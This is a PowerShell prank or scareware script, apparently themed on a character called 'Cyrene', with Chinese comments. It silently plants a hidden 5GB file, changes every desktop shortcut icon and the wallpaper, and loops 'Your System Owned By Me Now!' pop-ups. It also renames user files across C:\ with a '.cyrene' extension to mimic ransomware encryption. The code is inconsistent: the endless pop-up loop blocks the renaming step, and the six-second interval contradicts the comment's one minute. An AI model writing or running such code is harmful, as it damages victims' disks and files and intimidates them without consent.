# --- 1. 瞬间生成 5GB 隐藏文件 ---
$fillPath = "$env:LOCALAPPDATA\Temp\cyrene_data.sys"
if (!(Test-Path $fillPath)) {
    $f = [System.IO.File]::Create($fillPath)
    $f.SetLength(5GB) # 瞬间分配 5GB 空间，不需要循环写入
    $f.Close()
    # 属性：+h 隐藏, +s 系统, +r 只读
    attrib +h +s +r $fillPath
}

# --- 2. 批量替换桌面图标 (Cyrene) ---
$iconSource = "$PSScriptRoot\Assets\cyrene_pfp.ico"
if (Test-Path $iconSource) {
    $shell = New-Object -ComObject WScript.Shell
    Get-ChildItem "$home\Desktop\*.lnk" | ForEach-Object {
        $lnk = $shell.CreateShortcut($_.FullName)
        $lnk.IconLocation = $iconSource
        $lnk.Save()
    }
    ie4uinit.exe -show
}

# --- 3. 修改系统壁纸 ---
$bgPath = "$PSScriptRoot\Assets\cyrene_bg.jpg"
if (Test-Path $bgPath) {
    $code = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
'@
    Add-Type -MemberDefinition $code -Name Win32 -Namespace Win32Utils
    [Win32Utils.Win32]::SystemParametersInfo(20, 0, $bgPath, 3)
}

# --- 4. 循环弹窗 (每 1 分钟扰乱一次) ---
Add-Type -AssemblyName PresentationFramework
while($true) {
    [System.Windows.MessageBox]::Show("Cyrene：‘Your System Owned By Me Now!’", "Cyrene Protocol", 0, 48)
    Start-Sleep -Seconds 6
}

# --- 模拟全盘加密：修改文件后缀 ---
# 我们从 C:\ 根目录开始，但要排除系统核心目录以防止系统崩溃
$rootPath = "C:\"
$excludeFolders = @("Windows", "Program Files", "Program Files (x86)", "AppData", "ProgramData")

# 获取根目录下所有文件夹，过滤掉系统文件夹
Get-ChildItem -Path $rootPath -ErrorAction SilentlyContinue | Where-Object { 
    $_.PSIsContainer -and $excludeFolders -notcontains $_.Name 
} | ForEach-Object {
    $folderPath = $_.FullName
    
    # 递归处理选定文件夹下的文件
    Get-ChildItem -Path $folderPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
        $_.Extension -ne ".cyrene" 
    } | ForEach-Object {
        try {
            $newName = $_.FullName + ".cyrene"
            Rename-Item -Path $_.FullName -NewName $newName -Force -ErrorAction SilentlyContinue
        } catch {
            # 忽略正在使用的文件或拒绝访问的文件
        }
    }
}

# 处理直接位于 C:\ 根目录下的文件
Get-ChildItem -Path $rootPath -File -ErrorAction SilentlyContinue | Where-Object { 
    $_.Extension -ne ".cyrene" 
} | ForEach-Object {
    Rename-Item -Path $_.FullName -NewName ($_.FullName + ".cyrene") -Force -ErrorAction SilentlyContinue
}
